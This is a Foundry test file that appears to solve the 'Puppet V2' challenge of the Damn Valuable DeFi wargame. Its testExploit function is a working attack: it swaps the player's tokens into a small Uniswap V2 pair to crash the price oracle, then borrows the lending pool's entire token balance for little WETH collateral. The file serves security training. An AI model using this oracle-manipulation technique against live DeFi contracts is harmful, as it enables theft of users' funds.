// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test, console} from "forge-std/Test.sol";

import {PuppetV2Pool} from "../src/puppet-v2/PuppetV2Pool.sol";
import {DamnValuableToken} from "../src/DamnValuableToken.sol";
import {WETH9} from "../src/WETH.sol";
import {IUniswapV2Router, IUniswapV2Factory, IUniswapV2Pair} from "../src/interface/uniswapV2.sol";

contract puppetV2Test is Test {
    DamnValuableToken token;
    PuppetV2Pool lendingPool;
    WETH9 weth;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router uniswapV2Router;
    IUniswapV2Pair uniswapExchange;

    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
    uint256 UNISWAP_INITIAL_TOKEN_RESERVE = 100 ether;
    uint256 UNISWAP_INITIAL_WETH_RESERVE = 10 ether;

    uint256 PLAYER_INITIAL_TOKEN_BALANCE = 10000 ether;
    uint256 PLAYER_INITIAL_ETH_BALANCE = 20 ether;

    uint256 POOL_INITIAL_TOKEN_BALANCE = 1000000 ether;

    modifier excuteByUser(address _user) {
        vm.startPrank(_user);
        _;
        vm.stopPrank();
    }

    function setUp() public excuteByUser(deployer) {
        deal(player, PLAYER_INITIAL_ETH_BALANCE);
        deal(deployer, UNISWAP_INITIAL_WETH_RESERVE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH9();

        // Deploy Uniswap Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode("./json/UniswapV2Factory.json", abi.encode(address(0)))
        );
        uniswapV2Router = IUniswapV2Router(
            deployCode(
                "./json/UniswapV2Router02.json",
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Create Uniswap pair against WETH and add liquidity
        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(token),
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            block.timestamp * 2 // deadline
        );

        uniswapExchange = IUniswapV2Pair(
            uniswapV2Factory.getPair(address(token), address(weth))
        );
        assertGt(uniswapExchange.balanceOf(deployer), 0);

        // Deploy the lending pool
        lendingPool = new PuppetV2Pool(
            address(weth),
            address(token),
            address(uniswapExchange),
            address(uniswapV2Factory)
        );

        // Setup initial token balances of pool and player accounts
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        // Check pool's been correctly setup
        assertEq(
            lendingPool.calculateDepositOfWETHRequired(1 ether),
            0.3 ether
        );
        assertEq(
            lendingPool.calculateDepositOfWETHRequired(
                POOL_INITIAL_TOKEN_BALANCE
            ),
            (POOL_INITIAL_TOKEN_BALANCE * 0.3 ether) / 1e18
        );
    }

    function testExploit() public excuteByUser(player) {
        weth.deposit{value: player.balance}();

        // // pair token
        // console.log(
        //     "pair token:",
        //     token.balanceOf(address(uniswapExchange)) / 1e18
        // );
        // console.log(
        //     "pair weth:",
        //     weth.balanceOf(address(uniswapExchange)) / 1e18
        // );

        // console.log(
        //     "lendingPool token:",
        //     token.balanceOf(address(lendingPool)) / 1e18
        // );
        // console.log(
        //     "lendingPool weth:",
        //     weth.balanceOf(address(lendingPool)) / 1e18
        // );

        // console.log("player token:", token.balanceOf(player) / 1e18);
        // console.log("player weth:", weth.balanceOf(player) / 1e18);

        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
        uniswapV2Router.swapExactTokensForETH(
            PLAYER_INITIAL_TOKEN_BALANCE,
            1,
            path,
            player,
            block.timestamp + 1
        );
        weth.deposit{value: player.balance}();

        uint256 WETHRequired = lendingPool.calculateDepositOfWETHRequired(
            POOL_INITIAL_TOKEN_BALANCE
        );
        weth.approve(address(lendingPool), WETHRequired);
        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);

        assertEq(token.balanceOf(address(lendingPool)), 0);
        assertGe(token.balanceOf(player), POOL_INITIAL_TOKEN_BALANCE);
    }
}
